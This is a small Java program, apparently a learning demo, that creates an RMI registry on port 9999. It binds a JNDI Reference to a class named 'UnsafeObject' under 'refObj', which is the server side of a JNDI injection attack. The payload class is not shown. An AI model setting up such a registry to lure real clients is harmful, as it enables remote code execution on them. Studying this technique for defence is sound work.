package io.wesleyone;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main( String[] args ) throws NamingException, RemoteException, AlreadyBoundException {
        // 创建Registry
        Registry registry = LocateRegistry.createRegistry(9999);
        System.out.println("java RMI registry created. port on 9999...");
        Reference refObj = new Reference("io.wesleyone.UnsafeObject", "io.wesleyone.UnsafeObject", "io.wesleyone.UnsafeObject");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj", refObjWrapper);
    }
}
